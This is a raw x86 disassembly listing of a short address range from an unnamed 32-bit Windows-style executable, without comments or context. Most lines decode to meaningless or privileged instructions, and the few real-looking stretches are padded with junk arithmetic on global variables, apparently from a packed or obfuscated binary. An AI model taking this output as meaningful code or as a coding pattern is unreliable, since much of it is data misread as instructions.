  40a521:	aam    0x1c
  40a523:	dec    eax
  40a524:	arpl   WORD PTR [edx],cx
  40a526:	in     eax,dx
  40a527:	pop    ebx
  40a528:	add    eax,0x69c83132
  40a52d:	and    DWORD PTR [edi+0x41724f43],0x55
  40a534:	dec    ebp
  40a535:	push   ebx
  40a536:	xchg   ebx,eax
  40a537:	mov    ch,0x36
  40a539:	clc    
  40a53a:	cmp    BYTE PTR [esp+eiz*8-0x2fd9362b],0x33
  40a542:	pusha  
  40a543:	dec    edi
  40a544:	sbb    eax,0xe4febdab
  40a549:	mov    dh,0x82
  40a54b:	jo     0x40a56f
  40a54d:	lods   eax,DWORD PTR ds:[esi]
  40a54e:	xchg   DWORD PTR [eax-0x60],edi
  40a551:	repz cwde 
  40a553:	stos   BYTE PTR es:[edi],al
  40a554:	dec    ecx
  40a555:	mov    DWORD PTR [ebx+0x2c],esp
  40a558:	(bad)  
  40a55b:	jnp    0x40a55d
  40a55d:	and    eax,0x1a9693f2
  40a562:	outs   dx,DWORD PTR ds:[esi]
  40a563:	and    edx,eax
  40a565:	sbb    DWORD PTR ds:0x89e69096,ecx
  40a56b:	mov    ecx,0xfaa9a700
  40a570:	inc    esp
  40a571:	add    eax,0x7f0dc8c7
  40a576:	jg     0x40a516
  40a578:	xchg   BYTE PTR [esp+eiz*2-0x1],dh
  40a57c:	rol    BYTE PTR [ebp-0x3033d269],1
  40a582:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a583:	test   ebp,0x74be0d7a
  40a589:	ins    BYTE PTR es:[edi],dx
  40a58a:	arpl   WORD PTR [ebx-0x399a0ca6],ax
  40a590:	in     al,0x97
  40a592:	scas   eax,DWORD PTR es:[edi]
  40a593:	and    DWORD PTR [ebx],ebp
  40a595:	sbb    bl,dh
  40a597:	(bad)  
  40a598:	out    dx,eax
  40a599:	and    eax,0x828138d4
  40a59e:	data16 sub dh,bl
  40a5a1:	mov    al,0x53
  40a5a3:	outs   dx,BYTE PTR ds:[esi]
  40a5a4:	out    dx,eax
  40a5a5:	mov    edx,0x763c2ce3
  40a5aa:	xchg   ebx,eax
  40a5ab:	or     DWORD PTR [ecx],ecx
  40a5ad:	mov    edi,0x484d8b2
  40a5b2:	inc    edx
  40a5b3:	fstp   QWORD PTR [esp+ebp*8-0x71005c3d]
  40a5ba:	std    
  40a5bb:	not    al
  40a5bd:	jns    0x40a62c
  40a5bf:	fistp  DWORD PTR [ebx]
  40a5c1:	cwde   
  40a5c2:	sub    eax,0xfa50f38e
  40a5c7:	out    dx,al
  40a5c8:	cmp    BYTE PTR [edx+0x5c],bl
  40a5cb:	adc    DWORD PTR [ebx+0x2e],esi
  40a5ce:	jecxz  0x40a64d
  40a5d0:	mov    ch,0xf8
  40a5d2:	sbb    eax,0x33d1eb2
  40a5d7:	shl    BYTE PTR [esp+edx*4+0xd],1
  40a5db:	cmp    edi,ebx
  40a5dd:	dec    ecx
  40a5de:	sub    dl,ah
  40a5e0:	mov    esi,ecx
  40a5e2:	inc    edi
  40a5e3:	nop
  40a5e4:	mov    ecx,DWORD PTR [ebp+0x23c6f887]
  40a5ea:	push   esi
  40a5eb:	jge    0x40a655
  40a5ed:	cmp    BYTE PTR [eax],cl
  40a5ef:	push   es
  40a5f0:	lds    edi,FWORD PTR [ebp+eax*1-0x7d]
  40a5f4:	icebp  
  40a5f5:	test   eax,0xa7fd907f
  40a5fa:	add    DWORD PTR [ebx+edx*4-0x45],edx
  40a5fe:	inc    ecx
  40a5ff:	iret   
  40a600:	sbb    eax,0xeb4b1a06
  40a605:	dec    eax
  40a606:	rol    DWORD PTR [edx],1
  40a608:	sbb    eax,0x27ae73e2
  40a60d:	or     BYTE PTR [ecx-0x73],dh
  40a610:	adc    ecx,DWORD PTR [eax]
  40a612:	xor    ch,BYTE PTR [ebp-0x6eb646b9]
  40a618:	pushf  
  40a619:	sbb    eax,0xd350b443
  40a61e:	lds    esp,FWORD PTR [ebx+0x56b4b9ad]
  40a624:	loop   0x40a68c
  40a626:	xor    eax,0x22721280
  40a62b:	jmp    0x4ba3:0x8cbf152c
  40a632:	fwait
  40a633:	dec    ebx
  40a634:	stos   DWORD PTR es:[edi],eax
  40a635:	es mov ebp,esi
  40a638:	je     0x40a5cd
  40a63a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a63b:	fcmovnb st,st(5)
  40a63d:	jge    0x40a64d
  40a63f:	and    DWORD PTR [edi+0x6f],edx
  40a642:	xchg   eax,esp
  40a644:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a645:	xor    BYTE PTR [edx],bl
  40a647:	shl    DWORD PTR [ebp-0x7f4402f9],0x10
  40a64e:	sub    al,0xc9
  40a650:	push   dx
  40a652:	sbb    ecx,eax
  40a654:	pop    eax
  40a655:	daa    
  40a656:	xor    al,0xcd
  40a658:	scas   eax,DWORD PTR es:[edi]
  40a659:	leave  
  40a65a:	inc    ebx
  40a65b:	stc    
  40a65c:	imul   edx,DWORD PTR [ebp+0x4],0xffffffe7
  40a660:	out    0x5b,al
  40a662:	imul   eax,DWORD PTR [esi],0x78
  40a665:	cmp    dh,cl
  40a667:	aaa    
  40a668:	push   es
  40a669:	fwait
  40a66a:	jae    0x40a636
  40a66c:	and    dl,BYTE PTR es:[esi]
  40a66f:	fisttp WORD PTR [edx+edi*1-0x2c]
  40a673:	imul   edx,DWORD PTR [edx],0x725eecc6
  40a679:	xlat   BYTE PTR ds:[ebx]
  40a67a:	jne    0x40a6b9
  40a67c:	mov    di,0xc41e
  40a680:	dec    edx
  40a681:	xor    edi,edx
  40a683:	test   eax,0x55ae9544
  40a688:	sar    DWORD PTR [esi+0x253f859d],cl
  40a68e:	outs   dx,DWORD PTR ds:[esi]
  40a68f:	addr16 or eax,0xc6169094
  40a695:	shl    al,0x5d
  40a698:	mov    al,ds:0xaabc3ad5
  40a69d:	dec    edi
  40a69e:	xor    eax,ebx
  40a6a0:	sub    eax,0x3dddf9c3
  40a6a5:	push   es
  40a6a6:	or     eax,0x49c1a1f9
  40a6ab:	inc    edx
  40a6ac:	cmp    ebx,DWORD PTR [edx-0x54479e2b]
  40a6b2:	or     ebp,DWORD PTR ds:0x40c837aa
  40a6b8:	fs mov ebx,0x19c0b3f6
  40a6be:	add    DWORD PTR [esi+0x24fd3223],0x8fb77e7d
  40a6c8:	sub    bl,al
  40a6ca:	sbb    BYTE PTR gs:[esi-0x5a],bh
  40a6ce:	lock add eax,0xf07ae5c7
  40a6d4:	gs or  eax,0x42d48a65
  40a6da:	daa    
  40a6db:	nop
  40a6dc:	adc    al,BYTE PTR [ebx]
  40a6de:	(bad)  
  40a6df:	fcmovne st,st(3)
  40a6e1:	pop    esp
  40a6e2:	jle    0x40a74e
  40a6e4:	inc    edx
  40a6e5:	mov    BYTE PTR [ebx-0x7],ch
  40a6e8:	dec    ebx
  40a6e9:	jmp    0x40a751
  40a6eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a6ec:	(bad)  
  40a6ed:	cmp    edi,eax
  40a6ef:	mov    DWORD PTR ds:0x4336eb,0x5aa8
  40a6f9:	jne    0x40b4e6
  40a6ff:	adc    DWORD PTR ds:0x4336d7,0xbfa
  40a709:	push   DWORD PTR [ebp+0x8]
  40a70c:	add    DWORD PTR ds:0x433767,0x7522
  40a716:	call   0x4115fc
  40a71b:	sbb    ecx,0x1aca
  40a721:	mov    DWORD PTR [ebp-0x20],eax
  40a724:	mov    eax,DWORD PTR [ebp-0x4]
  40a727:	xor    esi,esi
  40a729:	xor    esi,DWORD PTR ds:0x433797
  40a72f:	or     DWORD PTR ds:0x4337a3,esi
  40a735:	mov    ecx,DWORD PTR [ebp-0x20]
  40a738:	mov    esi,0x7510854
  40a73d:	xor    eax,esi
  40a73f:	add    DWORD PTR ds:0x433793,0x433687
  40a749:	add    eax,ebx
  40a74b:	mov    DWORD PTR ds:0x43372f,0x4f05
  40a755:	cmp    ecx,eax
  40a757:	mov    DWORD PTR ds:0x4336e7,0x525
  40a761:	je     0x40b9ed
  40a767:	add    DWORD PTR ds:0x43376f,0x3590
  40a771:	push   DWORD PTR [ebp-0x20]
  40a774:	xor    DWORD PTR ds:0x43367f,0x1906
  40a77e:	push   DWORD PTR [ebp+0x8]
  40a781:	dec    DWORD PTR ds:0x43375b
  40a787:	call   0x40eac8
  40a78c:	movzx  ecx,WORD PTR ds:0x43368b
  40a793:	sub    DWORD PTR ds:0x4336a3,ecx
  40a799:	jmp    0x40a9fc
  40a79e:	or     al,0xd4
  40a7a0:	and    ah,bl
  40a7a2:	loopne 0x40a78c
  40a7a4:	shl    ah,1
  40a7a6:	sti    
  40a7a7:	and    eax,0xd40eec0c
  40a7ac:	and    ch,cl
  40a7ae:	push   ss
  40a7af:	in     eax,dx
  40a7b0:	jle    0x40a830
  40a7b2:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a7b6:	ins    DWORD PTR es:[edi],dx
  40a7b7:	add    edx,esi
  40a7b9:	popf   
  40a7ba:	data16 shl BYTE PTR [ebx+eiz*8],0x9a
  40a7bf:	mov    cl,0xfa
  40a7c1:	inc    edi
  40a7c2:	or     al,BYTE PTR [ecx]
  40a7c4:	scas   eax,DWORD PTR es:[edi]
  40a7c5:	sar    BYTE PTR [edi],0x65
  40a7c8:	and    BYTE PTR [edi+0x612673e8],dh
  40a7ce:	scas   al,BYTE PTR es:[edi]
  40a7cf:	jno    0x40a77f
  40a7d1:	pop    ecx
  40a7d2:	jmp    DWORD PTR [eax+ebp*2-0x53]
  40a7d6:	call   0xbd4a9518
  40a7db:	xchg   BYTE PTR [edi+0x6022635f],ah
  40a7e1:	cli    
  40a7e2:	mov    WORD PTR [ecx+0x20],?
  40a7e5:	xlat   BYTE PTR ds:[ebx]
  40a7e6:	mov    ch,0x90
  40a7e8:	and    al,BYTE PTR [edi]
  40a7ea:	jnp    0x40a803
  40a7ec:	pop    ebx
  40a7ed:	lahf   
  40a7ee:	shl    DWORD PTR [eax-0x1020a460],1
  40a7f4:	jno    0x40a7fc
  40a7f6:	cmp    edi,ecx
  40a7f8:	xchg   ebp,eax
  40a7f9:	mov    ch,0x48
  40a7fb:	and    esp,eax
  40a7fd:	fdivr  DWORD PTR [eax]
  40a7ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a800:	or     bh,0x2
  40a803:	adc    esi,DWORD PTR [esi-0x3b]
  40a806:	in     eax,dx
  40a807:	mov    edx,0x6dae58c8
  40a80c:	outs   dx,DWORD PTR ds:[esi]
  40a80d:	xor    eax,0x78cde0b8
  40a812:	sbb    al,0xa7
  40a814:	adc    ecx,ebp
  40a816:	add    BYTE PTR [esi+0x4d],dh
  40a819:	bound  ebp,QWORD PTR [edi-0x11]
  40a81c:	int3   
  40a81d:	mov    bh,0xb4
  40a81f:	push   cs
  40a820:	ror    DWORD PTR [edx-0x6bb5c97b],0x29
  40a827:	inc    BYTE PTR [edx]
  40a829:	ja     0x40a7ec
  40a82b:	mov    WORD PTR [ebp-0x25],fs
  40a82e:	push   esp
  40a82f:	jnp    0x40a862
  40a831:	ja     0x40a84d
  40a833:	shl    DWORD PTR [edx-0x4b666e4c],1
  40a839:	mov    ah,BYTE PTR [ebp+0x7ad7ebf0]
  40a83f:	stos   BYTE PTR es:[edi],al
  40a840:	xor    bh,dh
  40a842:	add    al,0xda
  40a844:	outs   dx,BYTE PTR ds:[esi]
  40a845:	retf   0x68dd
  40a848:	cmp    al,0x4c
  40a84a:	adc    al,0x22
  40a84c:	enter  0x2624,0xb5
  40a850:	push   ebp
  40a851:	outs   dx,DWORD PTR ds:[esi]
  40a852:	(bad)  
  40a853:	loop   0x40a8ad
  40a855:	add    al,0xb3
  40a857:	adc    al,0x40
  40a859:	in     al,0xe2
  40a85b:	add    ah,al
  40a85d:	jg     0x40a84a
  40a85f:	lahf   
  40a860:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a861:	pop    ebx
  40a862:	adc    al,0x8f
  40a864:	mov    ss,WORD PTR [ecx+eax*8]
  40a867:	ins    BYTE PTR es:[edi],dx
  40a868:	jmp    0x40a854
  40a86a:	or     ch,BYTE PTR ds:0x8a63715c
  40a870:	pop    ecx
  40a871:	or     BYTE PTR [esi-0x19],0xfd
  40a875:	cmp    al,0x48
  40a877:	je     0x40a854
  40a879:	out    dx,al
  40a87a:	repnz (bad) 
  40a87c:	retf   
  40a87d:	shr    DWORD PTR ds:0x1e1da53b,0x3d
  40a884:	xchg   ecx,eax
  40a885:	retf   
  40a886:	add    al,0x8e
  40a888:	mov    eax,ds:0x5391f910
  40a88d:	pop    es
  40a88e:	jl     0x40a839
  40a890:	adc    ecx,DWORD PTR [eax+0x79a2f8e2]
  40a896:	sar    BYTE PTR [eax-0x6f],cl
  40a899:	and    al,0xee
  40a89b:	hlt    
  40a89c:	stc    
  40a89d:	test   BYTE PTR [esi],ch
  40a89f:	fdiv   DWORD PTR [ebp-0x346814e9]
  40a8a5:	or     al,0x5d
  40a8a7:	mov    esp,0x337db89d
  40a8ac:	pop    es
  40a8ad:	es das 
  40a8af:	outs   dx,DWORD PTR ds:[esi]
  40a8b0:	sub    dh,BYTE PTR [ecx-0x59]
  40a8b3:	lods   al,BYTE PTR ds:[esi]
  40a8b4:	xchg   edi,eax
  40a8b5:	inc    edx
  40a8b6:	int3   
  40a8b7:	sbb    al,0x8f
  40a8b9:	shl    BYTE PTR [edx],1
  40a8bb:	sub    al,0x44
  40a8bd:	test   al,0x19
  40a8bf:	out    0x9b,eax
  40a8c1:	jbe    0x40a8aa
  40a8c3:	shl    DWORD PTR [esi-0x8],0x79
  40a8c7:	sub    BYTE PTR [ebx],0x80
  40a8ca:	mov    WORD PTR [ebp+0x327a9b2e],fs
  40a8d0:	mov    al,ds:0xd2aaf614
  40a8d5:	and    dh,BYTE PTR [eax]
  40a8d7:	xchg   edi,eax
  40a8d8:	int    0xab
  40a8da:	or     BYTE PTR [eax-0x5ec88ea9],bh
  40a8e0:	add    al,0x70
  40a8e2:	xlat   BYTE PTR ds:[ebx]
  40a8e3:	jmp    0x2e8e:0x1da42d6d
  40a8ea:	(bad)  
  40a8eb:	imul   ebx,edi,0xffffffdc
  40a8ee:	fsub   DWORD PTR [ecx+0x616c0d96]
  40a8f4:	jecxz  0x40a8f5
  40a8f6:	and    eax,0x431ad95f
  40a8fb:	add    BYTE PTR [edx-0x68],dl
  40a8fe:	dec    edi
  40a900:	test   eax,0xd8fa1913
  40a905:	fiadd  DWORD PTR [edi-0x6b]
  40a908:	mov    edi,0xd5ccda4c
  40a90d:	mov    ds:0xc3f94a5b,eax
  40a912:	adc    ebx,esp
  40a914:	sbb    ch,bh
  40a916:	inc    esp
  40a917:	ja     0x40a963
  40a919:	push   es
  40a91a:	xchg   DWORD PTR [eax-0x1f],ebp
  40a91d:	out    dx,eax
  40a91e:	mov    ds:0xb7168b8f,al
  40a923:	add    dl,ch
  40a925:	xlat   BYTE PTR ds:[ebx]
  40a926:	mov    dh,0x34
  40a928:	dec    esp
  40a929:	push   0x6e
  40a92b:	push   ebp
  40a92c:	cmp    ebp,DWORD PTR [edi]
  40a92e:	xor    DWORD PTR [ebx],esp
  40a930:	fnstenv [ebx]
  40a932:	jle    0x40a8f5
  40a934:	pop    ebp
  40a935:	jnp    0x40a8c9
  40a937:	jge    0x40a952
  40a939:	cwde   
  40a93a:	lds    ecx,FWORD PTR [ebp+0x23]
  40a93d:	in     eax,dx
  40a93e:	scas   eax,DWORD PTR es:[edi]
  40a93f:	jle    0x40a94a
  40a941:	fcomp  DWORD PTR [ebx+eiz*4-0x5c]
  40a945:	jns    0x40a915
  40a947:	cmp    ebx,ebp
  40a949:	lahf   
  40a94a:	jbe    0x40a8e8
  40a94c:	aam    0x96
  40a94e:	sti    
  40a94f:	inc    edx
  40a950:	in     al,0xdf
  40a952:	nop
  40a953:	outs   dx,BYTE PTR ds:[esi]
  40a954:	jge    0x40a9ad
  40a956:	out    dx,al
  40a957:	(bad)  
  40a958:	lods   al,BYTE PTR ss:[esi]
  40a95a:	call   0xfee1:0x2df79494
  40a961:	cmp    DWORD PTR [edi-0xd19cfe7],edx
  40a967:	sbb    esp,0x41a53c55
  40a96d:	retf   0xa76e
  40a970:	outs   dx,BYTE PTR ds:[esi]
  40a971:	leave  
  40a972:	pop    ds
  40a973:	ss pop es
  40a975:	enter  0xb5c,0x46
  40a979:	xor    ecx,DWORD PTR [edi+0x6ea3d564]
  40a97f:	fistp  QWORD PTR ds:0x71eb3a77
  40a985:	in     eax,dx
  40a986:	pushf  
  40a987:	mov    BYTE PTR [edi],al
  40a989:	mul    DWORD PTR [edi-0xffa40a2]
  40a98f:	fwait
  40a990:	xor    ecx,DWORD PTR [ecx-0x2fd4afd4]
  40a996:	push   ss
  40a997:	mov    edx,0x9ac02d91
  40a99c:	test   DWORD PTR [esi],eax
  40a99e:	dec    esi
  40a99f:	aaa    
  40a9a0:	sub    al,0x63
  40a9a2:	mov    ebp,0x3195dc7c
  40a9a7:	pop    eax
  40a9a8:	inc    esi
  40a9a9:	xchg   DWORD PTR [esi],esi
  40a9ab:	sbb    al,0xb0
  40a9ad:	xchg   BYTE PTR [ebp-0x24a0b431],cl
  40a9b3:	stos   BYTE PTR es:[edi],al
  40a9b4:	lods   eax,DWORD PTR ds:[esi]
  40a9b5:	inc    esi
  40a9b6:	jmp    0x74802355
  40a9bb:	mov    al,0xf
  40a9bd:	mov    cs,ecx
  40a9bf:	dec    esi
  40a9c0:	add    bh,dl
  40a9c2:	jmp    0xfdedaadb
  40a9c7:	push   edx
  40a9c8:	pop    esi
  40a9c9:	rcl    DWORD PTR [ecx+eax*4-0x25],1
  40a9cd:	xchg   edx,eax
  40a9ce:	dec    eax
  40a9cf:	pop    eax
  40a9d0:	xchg   edx,eax
  40a9d1:	jae    0x40aa40
  40a9d3:	jge    0x40a99e
  40a9d5:	push   ebx
  40a9d6:	and    al,bl
  40a9d8:	xor    BYTE PTR [ecx+0x77d4eb5b],dl
  40a9de:	push   ecx
  40a9df:	retf   
  40a9e0:	xlat   BYTE PTR ds:[ebx]
  40a9e1:	jmp    0xf42f:0x18fc6bc0
  40a9e8:	(bad)  
  40a9e9:	and    ebx,DWORD PTR [ecx-0x6d]
  40a9ec:	jmp    0x93fa96a6
  40a9f1:	rcr    DWORD PTR [edx+0xb91c9f6],cl
  40a9f7:	push   ds
  40a9f8:	call   FWORD PTR [ebx+0x4589f678]
  40a9fe:	in     al,dx
  40a9ff:	mov    eax,DWORD PTR [ebp-0x4]
  40aa02:	xor    DWORD PTR ds:0x433697,edi
  40aa08:	mov    ecx,DWORD PTR [ebp-0x14]
  40aa0b:	xor    eax,esi
  40aa0d:	adc    DWORD PTR ds:0x433797,0x433767
  40aa17:	add    eax,ebx
  40aa19:	mov    DWORD PTR ds:0x4336e7,0x6600
  40aa23:	jmp    0x40ac86
  40aa28:	dec    ebp
  40aa29:	ret    
  40aa2a:	xchg   esp,eax
  40aa2b:	push   eax
  40aa2c:	nop
  40aa2d:	push   ecx
  40aa2e:	dec    ecx
  40aa2f:	ret    
  40aa30:	mov    esp,DWORD PTR es:[edx+eiz*2]
  40aa34:	pop    ss
  40aa35:	sbb    al,0x9a
  40aa37:	dec    esp
  40aa38:	shr    bl,1
  40aa3a:	jle    0x40aaba
  40aa3c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40aa40:	push   edi
  40aa41:	outs   dx,BYTE PTR ds:[esi]
  40aa42:	aam    0xca
  40aa44:	mov    dh,BYTE PTR [ebx]
  40aa46:	es xchg ecx,eax
  40aa48:	cmp    dh,BYTE PTR [ebx+0x63]
  40aa4b:	add    eax,0xa24644e9
  40aa50:	cmc    
  40aa51:	inc    ecx
  40aa52:	jle    0x40aa74
  40aa54:	cmovs  eax,DWORD PTR [ecx+0x5bee370b]
  40aa5b:	fsubr  st(1),st
  40aa5d:	sub    ebp,DWORD PTR [edi+0x47]
  40aa60:	xchg   ecx,eax
  40aa61:	pop    edx
  40aa62:	scas   al,BYTE PTR es:[edi]
  40aa63:	test   DWORD PTR [ecx],ecx
  40aa65:	xchg   edx,eax
  40aa66:	pusha  
  40aa67:	in     al,dx
  40aa68:	aaa    
  40aa69:	leave  
  40aa6a:	jmp    0x8d20095f
  40aa6f:	mov    ds:0x5d84f401,al
  40aa74:	mov    BYTE PTR [ecx-0x34688304],bh
  40aa7a:	xchg   eax,eax
  40aa7c:	dec    ebx
  40aa7d:	mov    esi,DWORD PTR [edx]
  40aa7f:	cmp    eax,DWORD PTR [ebp+0x2a8ed267]
  40aa85:	sbb    eax,0x436dc5f8
  40aa8a:	mov    dh,0x20
  40aa8c:	cmp    ah,BYTE PTR [eax]
  40aa8e:	xchg   esp,eax
  40aa8f:	imul   edi,esi,0x824a1dab
  40aa95:	faddp  st(3),st
  40aa97:	push   0x48
  40aa99:	or     bh,bh
  40aa9b:	add    DWORD PTR [ebx+0x7e75a96b],edx
  40aaa1:	outs   dx,DWORD PTR ds:[esi]
  40aaa2:	imul   eax,DWORD PTR [ebp+0x4a5007c2],0xacccb2b5
  40aaac:	lahf   
  40aaad:	lods   eax,DWORD PTR ds:[esi]
  40aaae:	sbb    eax,0xa83e6b88
  40aab3:	pop    edi
  40aab4:	mov    ebp,0xf24e9b89
  40aab9:	loop   0x40aa4f
  40aabb:	mov    DWORD PTR [ebx*1+0xe895866],edx
  40aac2:	sbb    BYTE PTR [ebp-0x72],ch
  40aac5:	sar    BYTE PTR [ebx-0x1993068a],cl
  40aacb:	mov    ebx,0xd9980cc8
  40aad0:	push   ebp
  40aad1:	(bad)  
  40aad2:	cmp    ah,bl
  40aad4:	xchg   ebp,eax
  40aad5:	push   esi
  40aad6:	shr    al,1
  40aad8:	outs   dx,BYTE PTR ds:[esi]
  40aad9:	mov    DWORD PTR [ecx+0x6a2ac5e5],edi
  40aadf:	shr    cl,cl
  40aae1:	cmc    
  40aae2:	xor    edx,DWORD PTR [esp+eiz*4-0x48]
  40aae6:	mov    al,0xd4
  40aae8:	cdq    
  40aae9:	btc    DWORD PTR [esi-0x1b],esi
  40aaed:	mov    ch,0x60
  40aaef:	out    dx,al
  40aaf0:	xchg   ebp,eax
  40aaf1:	add    edx,DWORD PTR [ebp+0x4e]
  40aaf4:	xor    DWORD PTR [edi],esi
  40aaf6:	fwait
  40aaf7:	ret    
  40aaf8:	xchg   esp,eax
  40aaf9:	lea    esp,[eax]
  40aafb:	sbb    BYTE PTR [ebp+0x260927ab],ah
  40ab01:	(bad)  
  40ab03:	and    BYTE PTR [ebp-0x10],dl
  40ab06:	push   edx
  40ab07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab08:	ds popa 
  40ab0a:	ins    DWORD PTR es:[edi],dx
  40ab0b:	rcr    BYTE PTR [edi],cl
  40ab0d:	loope  0x40ab58
  40ab0f:	test   DWORD PTR [edx],esi
  40ab11:	nop
  40ab12:	ret    0x9785
  40ab15:	fnstcw WORD PTR [ebx]
  40ab17:	jb     0x40ab79
  40ab19:	adc    eax,0xe076a131
  40ab1e:	sub    DWORD PTR [ecx+0x44],edx
  40ab21:	mov    ds:0x1f5a3b73,al
  40ab26:	pop    ds
  40ab27:	imul   ebx,eax,0xd7ef2a45
  40ab2d:	std    
  40ab2e:	ret    
  40ab2f:	push   ebp
  40ab30:	dec    ebx
  40ab31:	inc    edx
  40ab32:	mov    ds:0xc417f693,eax
  40ab37:	mov    esp,0x280d9b4b
  40ab3c:	adc    ebp,edi
  40ab3e:	in     eax,dx
  40ab3f:	pop    ecx
  40ab40:	mov    dh,0x10
  40ab42:	rcr    DWORD PTR [esi+0x121dfd22],0x24
  40ab49:	cmp    dh,BYTE PTR [edx-0x591c66f7]
  40ab4f:	push   cs
  40ab50:	lahf   
  40ab51:	lea    ebx,[edx+edi*2-0xa]
  40ab55:	je     0x40abb3
  40ab57:	mov    dl,0xa7
  40ab59:	adc    BYTE PTR [ebx-0x5cba259f],0x17
  40ab60:	pop    edx
  40ab61:	or     DWORD PTR [ecx-0x4],0x4d
  40ab65:	mov    ebx,0xd84f588c
  40ab6a:	pop    esp
  40ab6b:	pop    eax
  40ab6c:	outs   dx,DWORD PTR ds:[esi]
  40ab6d:	and    eax,0xbab7a3c3
  40ab72:	fnstcw WORD PTR [ecx+0x5c]
  40ab75:	rcr    BYTE PTR [edi],0x31
  40ab78:	xchg   ebx,eax
  40ab79:	cli    
  40ab7a:	dec    edi
  40ab7b:	mov    dh,BYTE PTR [eax]
  40ab7d:	push   cs
  40ab7e:	push   ss
  40ab7f:	int    0x13
  40ab81:	call   0x4bdcc065
  40ab86:	jnp    0x40ab2e
  40ab88:	adc    esp,edx
  40ab8a:	retf   
  40ab8b:	mov    bl,0xfd
  40ab8d:	fld    DWORD PTR [ebp+eiz*2-0x22]
  40ab91:	repnz fmul DWORD PTR es:[esi-0x259c448a]
  40ab99:	fs clc 
  40ab9b:	jbe    0x40ac13
  40ab9d:	dec    edx
  40ab9e:	push   ds
  40ab9f:	push   eax
  40aba0:	repz inc ebx
  40aba2:	js     0x40ac23
  40aba4:	leave  
  40aba5:	(bad)  
  40aba6:	shl    BYTE PTR ds:0x88dcf935,1
  40abac:	fwait
  40abad:	cmp    BYTE PTR [ebx+0x34],0xc5
  40abb1:	lods   al,BYTE PTR ds:[esi]
  40abb2:	ror    DWORD PTR [esi+0x44],0x39
  40abb6:	lods   eax,DWORD PTR ds:[esi]
  40abb7:	(bad)  
  40abb8:	cmp    eax,0x9f116e50
  40abbd:	retf   0x79b3
  40abc0:	ret    0xf3d3
  40abc3:	cs or  al,0xab
  40abc6:	sbb    ebp,DWORD PTR [ecx]
  40abc8:	or     eax,0x5a207df6
  40abcd:	sbb    eax,0x65d9c5b5
  40abd2:	xchg   ebx,eax
  40abd3:	mov    edx,0x77a40671
  40abd8:	ins    BYTE PTR es:[edi],dx
  40abd9:	retf   0xed89
  40abdc:	xchg   bh,ch
  40abde:	sbb    eax,0xa34c6146
  40abe3:	pop    edi
  40abe4:	cmp    eax,0x9cc97cf0
  40abe9:	xchg   eax,eax
  40abeb:	jno    0x40abcd
  40abed:	stos   DWORD PTR es:[edi],eax
  40abee:	xchg   DWORD PTR [esi],ebx
  40abf0:	push   si
  40abf2:	jecxz  0x40ac58
  40abf4:	ss stos BYTE PTR es:[edi],al
  40abf6:	cmp    edx,ebp
  40abf8:	jmp    0x2034d593
  40abfd:	or     DWORD PTR [edi],eax
  40abff:	adc    DWORD PTR [esi],esp
  40ac01:	mov    eax,ds:0x8c99d333
  40ac06:	pop    ds
  40ac07:	cmp    cl,dh
  40ac09:	(bad)  
  40ac0a:	sti    
  40ac0b:	retf   0xdbdb
  40ac0e:	adc    al,0x61
  40ac10:	sahf   
  40ac11:	aam    0xcc
  40ac13:	mov    WORD PTR [eax-0x39],ds
  40ac16:	mov    ebp,0xc28d22c8
  40ac1b:	(bad)  
  40ac1c:	call   FWORD PTR [ebp-0x296b289b]
  40ac22:	mov    fs,WORD PTR [eax+0x248e5daa]
  40ac28:	lea    edi,[ebx-0x34cd494d]
  40ac2e:	mov    BYTE PTR [ebx],dl
  40ac30:	lock or al,0x5b
  40ac33:	dec    eax
  40ac34:	push   eax
  40ac35:	stos   BYTE PTR es:[edi],al
  40ac36:	mov    bl,0xf6
  40ac38:	outs   dx,BYTE PTR ds:[esi]
  40ac39:	mov    esi,0x1163d988
  40ac3e:	sub    DWORD PTR [esi],0x8f10c677
  40ac44:	lahf   
  40ac45:	mov    ecx,0x3f023420
  40ac4a:	fld    QWORD PTR [ebx]
  40ac4c:	lods   eax,DWORD PTR ds:[esi]
  40ac4d:	leave  
  40ac4e:	jle    0x40abe9
  40ac50:	retf   0xf427
  40ac53:	into   
  40ac54:	addr16 cs pop edi
  40ac57:	push   ds
  40ac58:	inc    eax
  40ac59:	rcr    BYTE PTR ss:[ebx],cl
  40ac5c:	stc    
  40ac5d:	or     BYTE PTR [eax],al
  40ac5f:	mov    esi,0x649cc850
  40ac64:	lods   eax,DWORD PTR ds:[esi]
  40ac65:	xor    eax,0xe181b3ee
  40ac6a:	jbe    0x40ac93
  40ac6c:	mov    ecx,0x627a9520
  40ac71:	xchg   edi,eax
  40ac72:	out    0x3f,eax
  40ac74:	in     eax,0x9c
  40ac76:	das    
  40ac77:	(bad)  
  40ac78:	fstp   TBYTE PTR [esp+ebp*1-0x23]
  40ac7c:	mov    ecx,0xd2d04f44
  40ac81:	cmp    DWORD PTR [ebx],edi
  40ac83:	mov    DWORD PTR [esi+0x66],edx
  40ac86:	cmp    ecx,eax
  40ac88:	je     0x40b9ed
  40ac8e:	sbb    DWORD PTR ds:0x4336eb,0x7413
  40ac98:	mov    eax,DWORD PTR [ebp-0x14]
  40ac9b:	and    DWORD PTR ds:0x43376f,0x0
  40aca5:	xor    ecx,ecx
  40aca7:	or     ecx,DWORD PTR ds:0x43376f
  40acad:	inc    ecx
  40acae:	mov    DWORD PTR ds:0x43376f,ecx
  40acb4:	cmp    DWORD PTR ds:0x43376f,0x6
  40acbb:	jne    0x40acdb
  40acc1:	push   0x433808
  40acc6:	push   0x43384c
  40accb:	push   0x3fa4
  40acd0:	push   0x125d
  40acd5:	call   DWORD PTR ds:0x4120e4
  40acdb:	cmp    DWORD PTR ds:0x43376f,0x5
  40ace2:	jne    0x40acf7
  40ace8:	xor    ecx,ecx
  40acea:	or     ecx,DWORD PTR ds:0x43376f
  40acf0:	inc    ecx
  40acf1:	mov    DWORD PTR ds:0x43376f,ecx
  40acf7:	cmp    DWORD PTR ds:0x43376f,0x1a
  40acfe:	jb     0x40aca5
  40ad04:	adc    DWORD PTR ds:0x43371f,0xf8d
  40ad0e:	jmp    0x40af71
